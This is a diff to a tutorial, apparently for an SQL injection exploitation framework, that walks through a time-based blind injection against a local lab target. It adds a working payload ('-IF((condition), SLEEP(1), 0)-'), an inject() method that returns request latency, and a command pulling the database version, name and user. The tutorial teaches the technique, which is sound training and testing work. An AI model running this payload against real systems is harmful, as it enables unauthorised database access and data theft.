@@ -82,7 +82,7 @@ This will generate a design specifically built for time-based SQL injections on 
 
 ## Filling the gaps
 
-The `inject()` method needs to induce a delay if `condition` is true. To do this in our case, we can build a payload such as:
+The `inject()` method needs to induce a delay if `condition` is true, and return how long the request took. To do this in our case, we can build a payload such as:
 
 ```
 '-IF(({condition}), SLEEP(1), 0)-'
@@ -91,12 +91,16 @@ The `inject()` method needs to induce a delay if `condition` is true. To do this
 We therefore have the following `inject()` method:
 
 ```python
-    async def inject(self, condition: Node) -> None:
+    async def inject(self, condition: Node) -> float:
         # TODO The payload must induce a delay if the condition is true
         payload = f"'-IF(({condition}), SLEEP(1), 0)-'"
         response = await self.send(payload)
-        return None
+        return response.latency
 ```
+
+!!! note
+
+    For every `HTTPDesign`, HTTP responses returned by `self.session` carry a `latency` attribute: a `float` holding the time, in seconds, the request took between leaving and the response arriving. This is exactly what a time-based `inject()` needs to return.
 
 Now, let's indicate the delay we used in `set_method()`.
 
@@ -120,6 +124,12 @@ Everything should go smoothly. We can now run a query to ensure that it works fi
 ```bash
 $ ending time-based-tutorial query -f 'version()' 'database()' 'user()'
 ```
+
+## Improving speed
+
+We chose a sleep time of 1 seconds here, but it does not have to be this big. Since we're on localhost, the RTT is super small, and we can thus go for a smaller value, such as 0.3 for instance. Be careful: the value needs to be changed in `inject()` *and* in `set_method()`.
+
+
 
 # Conclusion
 
